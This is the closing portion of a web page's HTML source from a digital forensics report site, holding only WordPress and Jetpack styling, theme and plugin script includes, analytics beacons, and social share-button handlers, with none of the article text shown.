p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.7.1" id="freenews-navigation-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.7.1" id="freenews-skip-link-focus-fix-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.7.1" id="ResizeSensor-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.7.1" id="theia-sticky-sidebar-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.7.1" id="slick-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.7.1" id="freenews-slick-settings-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.7.1" id="jquery-sticky-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.7.1" id="freenews-sticky-settings-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.7.1" id="marquee-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.7.1" id="freenews-marquee-settings-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://stats.wp.com/e-202451.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"5552\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:14.1\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "5552" ]);
/* ]]> */
</script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://c0.wp.com/p/jetpack/14.1/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=14.1" id="google-translate-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=14.1" id="jetpack-block-subscriptions-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://c0.wp.com/p/jetpack/14.1/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>

<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="1a310a3e4aa21af3edc3a22f-|49" defer></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"8f3c3df5efe86485","version":"2024.10.5","r":1,"serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"e6611380fbbe475a97dc9cf0a0e9fd2b","b":1}' crossorigin="anonymous"></script>
</body>
</html>
